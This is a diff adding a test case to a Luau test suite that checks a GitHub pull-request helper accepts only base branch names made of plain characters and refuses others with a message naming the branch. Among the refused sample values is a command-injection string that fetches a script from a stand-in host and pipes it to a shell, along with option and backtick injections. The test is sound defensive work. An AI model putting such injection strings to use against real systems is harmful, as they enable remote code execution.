@@ -636,6 +636,29 @@ case("github.pr: a head branch of plain name characters only is accepted, and a 
 	has(select(2, ask("a$b")).message, "a$b", "and the branch")
 end)
 
+case("github.pr: a base branch of plain name characters only is accepted, and a refusal names the branch", function(w: World)
+	local github = w.load("github") :: Github
+	local gh = newGh(w)
+	local function ask(baseRef: string): (any, any)
+		gh.meta["o/r#5"] = { base = "o/r", sha = sha("a"), ref = "feature", state = "open", baseRef = baseRef }
+		local got, why = nil :: any, nil :: any
+		github.pr("o/r", 5, nil, function(meta, problem, _cx)
+			got, why = meta, problem
+		end)
+		w.flush()
+		return got, why
+	end
+	for _, ok in { "main", "release/1.2_b+c@d" } do
+		eq(select(2, ask(ok)), nil, ok .. " is accepted")
+	end
+	for _, bad in { "x;curl${IFS}evil.sh|sh", "a$b", "x y", "-rf", "a`b`", "a\nb" } do
+		local got, why = ask(bad)
+		eq(got, nil, string.format("%q", bad) .. " is refused")
+		has(why.message, "base branch", "naming what is wrong")
+	end
+	has(select(2, ask("a$b")).message, "a$b", "and the branch")
+end)
+
 -- Shared by the github cases.
 local ghx = {
 	-- "<number>:<branch>" of every linked PR, "-" for a deleted branch: one string per PR, in order.
